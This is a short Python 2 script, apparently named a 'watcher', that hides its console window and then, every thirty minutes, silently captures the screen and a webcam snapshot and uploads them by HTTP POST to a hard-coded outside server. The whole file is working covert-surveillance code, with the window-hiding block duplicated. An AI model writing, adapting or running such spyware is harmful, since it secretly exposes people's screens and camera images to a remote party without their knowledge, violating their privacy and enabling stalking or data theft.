
import ImageGrab,urllib2,socket
from time import sleep,localtime,strftime
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
from VideoCapture import Device
import ctypes

#hide mainwindow
whnd = ctypes.windll.kernel32.GetConsoleWindow()  
if whnd != 0:  
    ctypes.windll.user32.ShowWindow(whnd, 0)  
    ctypes.windll.kernel32.CloseHandle(whnd)
import ctypes
whnd = ctypes.windll.kernel32.GetConsoleWindow()
if whnd != 0:
    ctypes.windll.user32.ShowWindow(whnd, 0)
    ctypes.windll.kernel32.CloseHandle(whnd)

#define global variables
PC_name = 'dpcl'
SiteURL = 'img.kmgnote.co.cc'
interval = 1800
#Open  Log file for writing
logfile = open('watcher.log','a')

#Some preparations
register_openers()
socket.setdefaulttimeout(60)
try:
    cam = Device(devnum=0, showVideoWindow=0)
except Exception:
    cam = None

#Start working!!
str_time = strftime("%Y/%m/%d %H:%M:%S", localtime())
logfile.write('='*50)
logfile.write('\n%s : Program Started!\n'%str_time)
if cam:
    logfile.write('%s : Camera is enabled.\n'%str_time)
while(True):
    img = ImageGrab.grab()
    img.save('screen.png')
    if cam: cam.saveSnapshot('cam.png')
    #Record current time
    str_time = strftime("%Y/%m/%d %H:%M:%S", localtime())
    
    #Open last screenshot file and get its string
    logfile = open('watcher.log','a')
    try:
        str_pic = open('screen.png', 'rb')
        if cam:str_cam = open('cam.png', 'rb')
    except:
        logfile.write(str_time+' : Error opening file.\n')
    logfile.write(str_time+' : Successfully read file.\n')

    #Build POST request
    url = 'http://%s/upload' % SiteURL
    if cam:
        devlist = (str_pic, str_cam)
    else:
        devlist = (str_pic,)
    for pic in devlist:
        print type(pic)
        datagen, headers = multipart_encode({'time':str_time, 'PC':PC_name, 'data':pic})
        request = urllib2.Request(url, datagen, headers)
        try:
            response = urllib2.urlopen(request).read()
            #event log
            if logfile.closed:logfile = open('watcher.log','a')
            if '200' in response:logfile.write(str_time+' : Successfully uploaded file.\n')
            elif '500' in response:logfile.write(str_time+' : Error uploading file.\n')
            else: logfile.write(str_time+' : %s\n' % response)
            logfile.close()
        except Exception as e:
            if 'response' in dir():logfile.write(str_time+(' : Unknown error: %s\n'%e.message))
    sleep(interval)
